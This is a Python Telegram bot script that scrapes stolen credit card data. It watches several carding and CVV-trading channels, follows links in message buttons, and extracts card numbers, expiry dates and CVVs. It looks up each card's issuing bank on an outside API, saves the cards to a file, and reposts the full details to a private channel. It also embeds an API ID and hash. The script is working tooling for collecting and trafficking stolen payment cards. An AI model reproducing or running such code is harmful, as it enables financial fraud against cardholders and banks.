from defs import getUrl, getcards, phone
from flask import Flask
import telethon
import asyncio
import os, sys
import re
import requests
from telethon import TelegramClient, events
import random_address
from random_address import real_random_address
import names
from datetime import datetime
import time
import random
from keep_alive import live 
from telethon.tl.types import PeerUser, PeerChat, PeerChannel

API_ID = 12770108
API_HASH = 'e2f7db56923167ec8bf8abe5a8c3e3d9'
SEND_ID = -1783178717
client = TelegramClient('session', API_ID, API_HASH)
ccs = []
chats = [
    '@Hackezdroperr', 
    '@cyberpirateschats',
    '@vipscraper',
    '@xforce_group8',
    '@CRKSOO_CC7', 
    '@RavenXc', 
    '@ScrapperLala', 
    '@xenscrape',
    '@CHECKER_GRATIS',
    '@deltaforcevips',
    '@CVV_LIVES',
    '@badboy_checkers',
    '@METODOSVIPOFICIAL',
    '@ccxen',
    '@Liveccbinsupport',
    '@BinccChecker',
    '@METODOSVIPOFICIAL',
    '@unknownstuffs',
    'paddilivecc2022',
    '@xfoxa',
    '@ezy_accounts',
    '@Good_Charged_CCS1',
    '@ccxenchat',
    '@deltaforcevips',
    '@botsakuraa',
    '@jetixbinchat'
  
  
  
]
with open('cards.txt', 'r') as r:
    temp_cards = r.read().splitlines()

for x in temp_cards:
    car = getcards(x)
    if car:
        ccs.append(car[0])
    else:
        continue


@client.on(events.NewMessage(chats=chats, func=lambda x: getattr(x, 'text')))
async def my_event_handler(m):
    if m.reply_markup:
        text = m.reply_markup.stringify()
        urls = getUrl(text)
        if not urls:
            return
        text = requests.get(urls[0]).text
    else:
        text = m.text
    cards = getcards(text)
    if not cards:
        return
    cc, mes, ano, cvv = cards
    if cc in ccs:
        return
    ccs.append(cc)
    extra = cc[0:0 + 12]
    bin = requests.get(f'https://bin-api-dragon.ga/bin/api/{cc[:6]}')
    if not bin:
        return
    bin_json = bin.json()
    fullinfo = f"{cc}|{mes}|{ano}|{cvv}"
    #print(f'{cc}|{mes}|{ano}|{cvv}')
    print(f'{cc}|{mes}|{ano}|{cvv} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅')
    with open('cards.txt', 'a') as w:
        w.write(fullinfo + '\n')
    await client.send_message(
        PeerChannel(SEND_ID),
        f"""
🔥 ¡𝐍𝐄𝐖 𝐂𝐀𝐑𝐃 𝐀𝐑𝐑𝐈𝐕𝐄𝐃! 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━
𝙲𝙰𝚁𝙳: **`{cc}|{mes}|{ano}|{cvv}`**
━━━━━━━━━━━━━━━━━━━━━━━━━
𝙱𝙸𝙽: **`{cc[:6]}`**

𝚃𝚈𝙿𝙴: **`{bin_json['data']['vendor']} | {bin_json['data']['type']} | {bin_json['data']['level']}`**

𝙱𝙰𝙽𝙺: **`{bin_json['data']['bank']}`**

𝙲𝙾𝚄𝙽𝚃𝚁𝚈: **`{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}`**
━━━━━━━━━━━━━━━━━━━━━━━━━
𝙴𝚇𝚃𝚁𝙰: **`{extra}xxxx|{mes}|{ano}`**
━━━━━━━━━━━━━━━━━━━━━━━━━
𝑺𝑪𝑹𝑨𝑷𝑷𝑬𝑹 𝒃𝒚: @TXFNX
━━━━━━━━━━━━━━━━━━━━━━━━━

""",file = 'fnx.jpg')


@client.on(events.NewMessage(outgoing=True, pattern=re.compile(r'.lives')))
async def my_event_handler(m):
    # emt = await client.get_entity(1582775844)
    # print(telethon.utils.get_input_channel(emt))
    # print(telethon.utils.resolve_id(emt))
    await m.reply(file='cards.txt')
    time.sleep(30)

live()
client.start()
client.run_until_disconnected()